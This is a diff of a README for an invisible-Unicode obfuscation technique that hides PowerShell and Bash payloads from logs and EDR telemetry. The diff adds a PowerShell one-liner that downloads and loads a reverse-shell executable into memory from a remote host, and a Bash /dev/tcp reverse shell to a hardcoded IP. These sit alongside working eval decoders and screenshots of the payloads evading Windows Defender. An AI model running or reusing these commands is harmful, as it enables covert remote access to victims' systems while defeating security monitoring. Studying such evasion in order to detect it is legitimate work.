@@ -7,7 +7,7 @@ https://reggia.xyz/posts/invisible-unicode-obfuscation-beyong-glassworm.html
 
 ## Overview
 
-The technique leverages Unicode characters that are rendered as invisible (or near-invisible) in consoles, process listings, and security telemetry (XDR/EDR). Although visually indistinguishable from whitespace or empty strings, these characters have distinct byte representations and can therefore carry information.
+The technique leverages Unicode characters that are rendered as invisible (or near-invisible) in consoles, process listings, and security telemetry and logs (XDR/EDR). Although visually indistinguishable from whitespace or empty strings, these characters have distinct byte representations and can therefore carry information.
 
 ## How It Works
 
@@ -23,7 +23,7 @@ The decoder reverses the process, reconstructs the original payload, and evaluat
 
 ## Obfuscator tool
 
-This repository includes a client-side encoder/decoder tool implemented in JavaScript (file `invisibleUnicodeObfuscator.html` ). You can find an online version on this tool on my website: https://reggia.xyz/tools/invisible-unicode-obfuscator.html
+This repository includes a client-side encoder/decoder tool implemented in JavaScript (file `invisibleUnicodeObfuscator.html` ). An online version of the tool is available on my website: https://reggia.xyz/tools/invisible-unicode-obfuscator.html
 
 ![4.png](4.png)
 
@@ -57,9 +57,25 @@ powershell.exe -NoProfile -NoLogo -Command {param($e)$d=-join([regex]::Matches((
 
 This variant spawns powershell.exe from an existing PowerShell session using a ScriptBlock and -Args, causing the host to serialize the invisible Unicode payload as XML and then Base64-encode it into -EncodedCommand and -EncodedArguments, making it appear empty in logs while remaining executable.
 
+An attacker can use these variants to encode malicious payloads. For example, `[Reflection.Assembly]::Load((iwr -Uri http://10.0.2.2:8000/revshell.exe -UseBasicParsing).RawContentStream.ToArray()); [ConnectBack.Program]::Main("")` can be used to download and load a malicious reverse shell directly into memory, gaining access to the victim system without spawning any additional child processes. As a result, the last relevant event may appear insignificant or non-malicious to an analyst, as it is composed almost entirely of whitespace and seems to operate on an empty variable.
+
 ## POC (Linux)
+
+An attacker can encode payloads with this technique on Linux as well. For example, you can encode a very simple reverse shell like `exec 5<>/dev/tcp/82.85.145.134/80;cat <&5 | while read line; do $line 2>&5 >&5; done`, implemented exclusively using Bash built-in features, thus avoiding the execution of child processes that might expose the real command or its output.
 
 ### Bash decoder (eval + Perl)
 ```bash
 eval "$(echo -n '                                                 ' | perl -C -ne 'foreach(split//){print(ord($_)==0x0009?"1":"0")}' | perl -lpe '$_=pack("B*",$_)')"
 ```
+
+## Proofs
+
+### Powershell decoder variant #1 in Windows Defender
+![1.png](1.png)
+### Powershell decoder variant #2 in Windows Defender
+![2.png](2.png)
+![3.png](3.png)
+### Powershell decoder variant #1 (in memory Reverse Shell) in Sysinternal Process Explorer
+![5.png](5.png)
+### Bash decoder (Reverse Shell) in pspy
+![6.png](6.png)
